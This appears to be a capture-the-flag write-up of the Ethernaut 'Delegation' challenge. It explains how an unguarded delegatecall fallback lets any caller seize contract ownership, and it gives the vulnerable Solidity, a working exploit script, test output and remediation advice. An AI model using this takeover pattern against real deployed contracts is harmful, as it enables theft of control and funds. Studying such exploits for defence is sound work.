# Delegation — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 06 — Delegation](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-delegation) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Delegation.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`Delegation.fallback` blindly `delegatecall`s all `msg.data` into `Delegate`. `Delegate.pwn()` sets `owner = msg.sender` with no access control. Because both contracts store `owner` in slot 0, and `delegatecall` preserves `msg.sender`, a single call with the `pwn()` selector makes the player `Delegation.owner`.

**Impact:** unprivileged ownership takeover — the core lesson behind unsafe proxy / `delegatecall` usage.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player owns `Delegation` | `delegationInstance.owner() == PLAYER_ADDRESS` |

---

## Finding

### [C-01] Unrestricted `delegatecall` of user calldata

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Unsafe `delegatecall` / storage collision |
| **Location** | `Delegation.fallback`, `Delegate.pwn` |
| **CWE** | [CWE-829](https://cwe.mitre.org/data/definitions/829.html) — Inclusion of Functionality from Untrusted Control Sphere |
| **SWC** | [SWC-112](https://swcregistry.io/docs/SWC-112) — Delegatecall to Untrusted Callee |

#### Vulnerable code

```solidity
function pwn() public {
    owner = msg.sender;
}

fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    result;
}
```

#### Why it works

| Property | Effect |
|----------|--------|
| `delegatecall` | Code from `Delegate`, storage/context of `Delegation` |
| `msg.sender` preserved | Player address written into `owner` |
| Slot 0 = `owner` in both | Write hits `Delegation.owner` |

#### Proof of concept

```bash
cd web3-ctf-challenges/06-ethernaut-delegation
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 57552)
```

---

## Attack scenario

```
Player ──call(pwn())──► Delegation (no pwn)
                              │
                              ▼ fallback
                        delegate.delegatecall(pwn selector)
                              │
                              ▼ Delegate.pwn code, Delegation storage
                        owner (slot 0) = player
```

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | EOA with gas |
| **2. Call** | `delegation.call(abi.encodeWithSignature("pwn()"))` |
| **3. Result** | `owner == player` |
| **4. Cost** | Gas only |
| **5. ROI** | Full ownership |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    (bool success,) = address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
    require(success, "pwn() delegatecall path failed");

    vm.stopBroadcast();
}
```

Equivalent: `abi.encodeWithSelector(bytes4(keccak256("pwn()")))` or `abi.encodeCall` against an interface with `pwn()`.

---

## Remediation

- Do not forward arbitrary `msg.data` through `delegatecall`.
- Prefer explicit, access-controlled functions.
- For proxies: use audited frameworks (e.g. OZ UUPS/Transparent) with correct storage slots (`ERC-1967`) and initializer guards.

---

## Key lessons

1. **`delegatecall` runs foreign code on your storage** — treat it like giving another contract a pen on your state.
2. **Storage layout must match** — mismatched slots corrupt unrelated variables.
3. **`fallback` is an entry point** — same scrutiny as public functions.

---

## References

- [SCH Delegation challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-delegation)
- [SWC-112: Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112)
- Local: `Exploit.s.sol`, `test/DelegationExploit.t.sol`
